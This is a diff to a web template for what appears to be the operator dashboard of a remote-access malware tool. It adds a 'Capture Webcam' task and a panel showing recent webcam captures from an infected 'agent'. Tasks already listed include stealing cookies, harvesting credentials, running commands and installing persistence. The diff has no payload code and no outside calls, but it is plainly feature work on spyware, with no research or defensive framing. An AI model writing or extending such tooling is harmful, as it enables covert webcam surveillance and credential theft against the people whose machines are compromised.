@@ -77,6 +77,18 @@
                     {% endif %}
                 </div>
             </div>
+
+            <div class="card shadow-sm mb-4">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h5 class="mb-0">Recent Webcam Captures</h5>
+                    <a href="{{ base_url }}{{ url_for('webcam_captures') }}?agent_id={{ agent.id }}" class="btn btn-sm btn-outline-primary">
+                        View All
+                    </a>
+                </div>
+                <div class="card-body" id="webcam-section">
+                    <p class="text-muted">Webcam captures will appear here when captured</p>
+                </div>
+            </div>
         </div>
 
         <div class="col-md-6">
@@ -88,6 +100,7 @@
                             <option value="">Select Task</option>
                             <option value="steal_cookies">Steal Cookies</option>
                             <option value="screenshot">Take Screenshot</option>
+                            <option value="webcam">Capture Webcam</option>
                             <option value="harvest_creds">Harvest Credentials</option>
                             <option value="shell">Execute Command</option>
                             <option value="persist">Install Persistence</option>
